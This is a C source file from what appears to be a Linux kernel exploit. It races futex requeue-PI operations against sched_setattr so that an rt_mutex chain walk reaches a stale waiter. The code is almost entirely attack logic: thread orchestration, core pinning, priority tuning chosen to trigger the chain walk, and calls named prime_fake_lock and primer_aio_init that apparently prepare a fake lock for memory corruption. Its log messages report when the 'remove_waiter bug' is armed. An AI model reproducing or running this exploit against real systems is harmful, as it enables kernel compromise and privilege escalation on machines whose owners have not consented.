#include "common.h"

#ifndef __NR_sched_setattr
#define __NR_sched_setattr 274
#endif

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int current_phase;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(WAITER_CORE);

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += 1;

  atomic_store(&waiter_waiting, 1);

  primer_aio_init();

  // 1. WAITER_CORE pinning (above): no competing tasks -> TIF_NEED_RESCHED
  //    set by the consumer's sched_setattr can't actually context-switch us
  //    until the chain walk completes (microseconds vs 4 ms timer period).
  // 2. stale_waiter->tree.prio = 120 (SCHED_NORMAL/nice=0 when we block
  //    here) != consumer's new_prio 130 (SCHED_BATCH/nice=10) -> chain walk
  //    is triggered via rt_mutex_adjust_prio_chain as before.
  // Ensure nice=0 so stale_waiter->tree.prio is exactly 120.
  setpriority(PRIO_PROCESS, 0, 0);

  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  prime_fake_lock();

  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int waiter_boost_nice = 10;
  struct local_sched_attr batch_attr = {0};
  batch_attr.size        = sizeof(batch_attr);
  batch_attr.sched_policy = SCHED_BATCH;
  batch_attr.sched_nice  = waiter_boost_nice;
  batch_attr.sched_priority  = 0;
  int tid = atomic_load(&waiter_tid);

  while (!atomic_load(&punch_consume_go)) {
    __asm__ volatile("yield" ::: "memory");
    continue;
  }
  //int delay_usec = 100;
  int delay_usec = 0;
  if (delay_usec > 0) {
    pr_info("consumer usleep=%d\n", delay_usec);
    usleep((useconds_t)delay_usec);
  }
  errno = 0;
  int sched_ret = syscall(SYS_sched_setattr, tid, &batch_attr, 0);
  if (sched_ret == 0) {
    pr_success("Chainwalk complete\n");
    atomic_fetch_add(&consumer_success, 1);
  } else {
    pr_warning("Chainwalk failed errno=%d\n", errno);
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
}

void run_main_route_threads(void) {
  pr_info("%s\n", __func__);
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  long requeue_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  pr_info("main requeue ret=%ld errno=%d %s\n", requeue_ret, requeue_errno,
          requeue_ret == -1 && requeue_errno == EDEADLK
              ? "(cycle detected: remove_waiter bug armed)"
              : "(cycle NOT detected: check owner_thread)");

  while (!atomic_load(&route_done)) {
    usleep(10000);
  }
}
